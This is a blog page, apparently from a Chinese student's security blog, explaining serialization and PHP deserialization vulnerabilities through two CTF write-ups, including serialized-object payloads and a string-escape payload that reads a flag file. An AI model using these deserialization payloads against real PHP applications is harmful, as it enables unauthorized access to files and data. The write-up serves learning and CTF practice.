@@ -1,0 +1,1014 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">序列化和反序列化 | Cupid&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "Cupid'sblog";
+  mashiro_option.author_name = "blog";
+  mashiro_option.site_url = "https://bephplover.github.io/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(1).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(2).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(3).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(4).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(5).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(6).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(7).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(8).jpg.webp".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+</head>
+</html>
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://bephplover.github.io/">
+          <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/custom/namei.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>Welcome to my blog,have a good time!</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/bephplover" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://weibo.com/mashirozx?is_all=1" target="_blank" class="social-github" title="sina">
+                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/sina.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://music.163.com/#/user/home?id=623980935" target="_blank" class="social-github" title="wangyiyun">
+                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/wangyiyun.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://weibo.com/mashirozx?is_all=1" target="_blank" class="social-github" title="zhihu">
+                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/zhihu.png">
+                  </a>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">Cupid&#39;s</span>
+            <span class="shironeko">blog</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/技术/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/内网渗透/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          内网渗透
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/编程类/">
+                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                          编程学习
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/Linux/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          Linux学习
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/CTF/">
+                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                          CTF
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/Web漏洞/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          Web渗透
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/悦读/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          书单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-headphones" aria-hidden="true"></i>
+                          歌单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/图集/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          图集
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    留言板
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+                    友人帐
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/theme-sakura/">
+                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                          主题
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/lab/">
+                          <i class="fa fa-cogs" aria-hidden="true"></i>
+                          Lab
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/atom.xml">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+                    RSS
+                  </span>
+                </a>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(http://175.24.19.33/image/9bd9b167gy1g4c8qcc821j21hc0u0ay3.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="http://175.24.19.33/image/9bd9b167gy1g4c8qcc821j21hc0u0ay3.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      序列化和反序列化</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="">
+          </a>
+        </span>
+        <span>
+          <a href=""></a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-9-19<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h3><span id="0x00背景">0x00背景</span></h3><p>写这篇文章的原因是因为今天向大佬问了一个问题:</p>
+<p><img src="/2020/09/19/序列化和反序列化/1.png" alt="image.png"></p>
+<p>文章作者提到$this-&gt;_dataReader可控</p>
+<p>我一直纠结着为啥可控，并询问了大佬。</p>
+<p>最后得到了一句精华:</p>
+<p>反序列化一个类出来，只要是类的属性，肯定可控</p>
+<p>针对这句话，好好学习下序列化和反序列化。</p>
+<h3><span id="0x00正题">0x00正题</span></h3><p>定义:什么是序列化？反序列化？</p>
+<p>java序列化是指把java对象转换为字节序列的过程</p>
+<p>java反序列化就是指把字节序列恢复为java对象的过程。</p>
+<p>序列化的作用呢？</p>
+<p>在传递和保存对象时，保证对象的完整性和可传递性。对象转换为有序字节流，以便在网络上传输或者保存在本地文件中。</p>
+<p>反序列化呢是根据字节流中保存的对象状态以及描述信息，通过反序列化重构对象。</p>
+<p>当然这是从代码层面上理解的作用，通俗点来说序列化是为了让一些数据包括视频、音频、图像、变量、一个类在网络传输时候更方便，更持久，更易于保存。</p>
+<p>而反序列是为了让序列化后的对象，当再次需要调用这个对象的方法时能够反序列化为原来的对象。</p>
+<p>这句话看似很拗口，其实已经是我自己认为最好理解的语句。</p>
+<p>从这儿已经可以解释文前大佬说的:反序列化一个类出来，只要是类的属性，肯定可控。为什么可控？</p>
+<p>个人总结如下:</p>
+<pre><code>反序列化就是为了对象重构而去调用方法，而之所以需要重新调用方法就是因为有用户可传入的参数需要处理</code></pre><p>所以迷惑解开了，接下来进一步对其进入深入了解，就像tla一样需要深入了解，^_^!</p>
+<p>接下来由于过菜，只能接着用php进行研究，java之后补上来。</p>
+<p>虽然前面说的是java序列化，但其实只有不同语言的特性，但序列化的含义都大同小异。</p>
+<h3><span id="0x03php反序列化漏洞具体实例">0x03php反序列化漏洞具体实例</span></h3><p>这里用之前参加极客大挑战做的一道基础反序列化题目:</p>
+<pre><code class="php">&lt;?php
+class Student
+{
+    public $score = 0;
+    public function __destruct()
+    {
+        echo &quot;__destruct working&quot;;
+        if($this-&gt;score==10000) {
+            $flag = &quot;******************&quot;;
+            echo $flag;
+        }
+    }
+}
+$exp = $_GET[&#39;exp&#39;];
+echo &quot;&lt;br&gt;&quot;;
+unserialize($exp);</code></pre>
+<p>题目很简单，我们仔细分析一下解题构造利用链。</p>
+<pre><code>php的反序列化漏洞主要存在于魔术方法，啥是魔术方法呢？
+按我的理解就是它自己就可以执行，不需要我们人为去特意调用它。
+接下来介绍两个基础的方法:
+构造函数和析构函数:
+__construct和__destruct
+__construct:具有构造函数的类会在每次创建新对象时先调用此方法。
+__destruct:析构函数会在某个对象的所有引用都被删除或者当对象被显式销毁时执行。</code></pre><p>那么这道题就需要让__destruct析构函数执行并且伪造其中的变量值最终拿到flag.</p>
+<p>当我们传入序列化的数据进去后，这时候对象的引用就被删除了，从而导致了析构函数执行。</p>
+<p>然后传入的数据再由反序列化函数unserialize执行，最终成功将我们的序列化数据反序列化具体对象引用变量的值，从而达到改变了原有代码写定的变量的值，最后绕过判断拿到flag.</p>
+<p>整个利用:传入序列化——&gt;__destruct执行—-&gt;序列化被传入-&gt;反序列化函数-&gt;传入的具有新的值的变量覆盖原有变量的值-&gt;达成If条件-&gt;取得flag.</p>
+<p>最后写一个类生成序列化数据:</p>
+<p><img src="/2020/09/19/序列化和反序列化/image-20200919103047397.png" alt="image-20200919103047397"></p>
+<p>接下来再传入1.php</p>
+<pre><code>?exp=O:7:&quot;Student&quot;:1:{s:5:&quot;score&quot;;i:10000;}</code></pre><p>最后就拿到了flag.</p>
+<p>这是最基础的反序列化漏洞的利用，也是反序列化漏洞原理掌握的启蒙。</p>
+<p>当然在这之后又设计到了类中的私有对象和保护对象的序列化，与公开的对象又有一定区别。</p>
+<p>private成员变量被序列化变成%00test%00</p>
+<p>而protecter的成员变量变成%00*%00test</p>
+<p>而这些在浏览器打印是不会被显示的，所以在遇到这样的成员变量时打印出来的序列化数据还需要自己加上这些。</p>
+<h3><span id="0x04反序列化漏洞进一步拓展练习">0x04反序列化漏洞进一步拓展练习</span></h3><p>前面的构造链很简单就是让析构函数被调用并且覆盖原有的值，接下来练习一下更加复杂的反序列化利用链的题。</p>
+<h4><span id="安洵杯-2019easy_serialize_php">[安洵杯 2019]easy_serialize_php</span></h4><p>开局源码分析:</p>
+<pre><code class="php"> &lt;?php
+
+$function = @$_GET[&#39;f&#39;];
+
+function filter($img){
+    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
+    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
+    return preg_replace($filter,&#39;&#39;,$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
+$_SESSION[&#39;function&#39;] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
+}
+
+if(!$_GET[&#39;img_path&#39;]){
+    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
+}else{
+    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == &#39;highlight_file&#39;){
+    highlight_file(&#39;index.php&#39;);
+}else if($function == &#39;phpinfo&#39;){
+    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
+}else if($function == &#39;show_image&#39;){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre>
+<p>这道题看完代码仍然是迷糊的没有思路，于是上网学习了一下关于这道题的bypass思路。</p>
+<p>1.php反序列化字符逃逸</p>
+<p>所谓逃逸就是逃出特定规则，php的反序列化过程必须严格按照序列化规则才能实现反序列化</p>
+<p>那么这个规则如何逃逸呢？</p>
+<p>大佬们测试了在原有的序列化后添加字符:</p>
+<pre><code class="php">&lt;?php
+$str=&#39;a:2:{i:0;s:5:&quot;Cupid&quot;;i:1;s:5:&quot;aaaaa&quot;;}abc&#39;;
+#$str=&#39;a:2:{i:0;s:5:&quot;Cupid&quot;;i:1;s:5:&quot;aaaaa&quot;;}&#39;
+var_dump(unserialize($str));
+?&gt;</code></pre>
+<p>我们拿到php中运行一下</p>
+<p><img src="/2020/09/19/序列化和反序列化/image-20200919152323515.png" alt="image-20200919152323515"></p>
+<p>可以看到跟不加abc字符反序列化后的结果一样，说明php能够识别出哪些属于反序列化的范畴并自动过滤。</p>
+<p>利用这个特性可以绕过某些针对字符的检测机制。</p>
+<p>第二个逃逸点:</p>
+<pre><code class="php">&lt;?php
+$_SESSION[&quot;user&quot;]=&#39;flagflagflagflagflagflag&#39;；
+$_SESSION[&quot;function&quot;]=&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&#39;;
+$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;
+echo serialize($_SESSION);
+?&gt;
+最后得到:    
+a:3:{s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></pre>
+<p>接下来再看一下上面这个例子，假如题目中会过滤掉flag字段(替换为空)。</p>
+<p>那么上面的序列化字符串过滤后及变成了:</p>
+<pre><code>a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></pre><p>那么这个时候再将这串字符串进行反序列化后会得到什么呢？</p>
+<p>仔细观察上面被过滤后和原来字符串的变化，6个flag字符长度24，替换后为空。</p>
+<p>但反序列化机制才不管这么多呢，它会继续向后读取24个字符也就是会读取到:</p>
+<pre><code>;s:8:&quot;function&quot;;s:59:&quot;a</code></pre><p>最后读取到以”;结尾。</p>
+<p>而后按照img的规则分别向后读取，最后满足反序列化规则依然成功的反序列化出:</p>
+<p>替换后的真实结果是:</p>
+<pre><code>a:2:{s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}
+可以看到依然是反序列化为正确的</code></pre><p>将其反序列化后就是:</p>
+<pre><code class="php">结果:
+array(3) { 
+[&quot;user&quot;]=&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot; 
+[&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; 
+[&quot;dd&quot;]=&gt; string(1) &quot;a&quot; 
+}</code></pre>
+<p>用数组形式构造就是:</p>
+<pre><code class="php">$_SESSION[&quot;user&quot;]=&#39;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#39;;
+$_SESSION[&quot;img&quot;]=&#39;ZDBnM19mMWFnLnBocA==&#39;;
+$_SESSION[&quot;dd&quot;]=&#39;a&#39;;</code></pre>
+<p>最后就是回到题目构造利用链最后拿flag了。</p>
+<p>这道题之所以需要逃逸就是存在img的部分，导致无法让反序列化函数反序列化后的数据达到我们想要的读取效果，因而需要把img的部分给他脱离掉换上我们的img。</p>
+<p>关于base64的内容是phpinfo里面找到的:d0g3_f1ag.php</p>
+<p>所以最后的payload：</p>
+<pre><code>_SESSION[phpflag]=;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></pre><p>最后get传参?f=show_image,再通过post传入参数(上面的payload)送入extract变量覆盖-&gt;最后送入反序列化后解码img的部分-&gt;并读取d0g3_f1ag.php</p>
+<p><img src="/2020/09/19/序列化和反序列化/image-20200919155741608.png" alt="image-20200919155741608"></p>
+<p>再将这个文件路径进行base64编码</p>
+<p>最后拿到flag：</p>
+<p><img src="/2020/09/19/序列化和反序列化/image-20200919155638209.png" alt="image-20200919155638209"></p>
+<p>喔，最后再去看AdminTony大佬写的文章好像没有那么吃力了(自己唬自己还是很吃力，tcl毕竟……)</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7null"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7null"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2020/09/22/MsSql-提权/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                MsSql-提权</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2020/09/17/java-basic/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="http://175.24.19.33/image/2.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="http://175.24.19.33/image/2.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                java-basic</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author"></a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            // PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Cupid<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
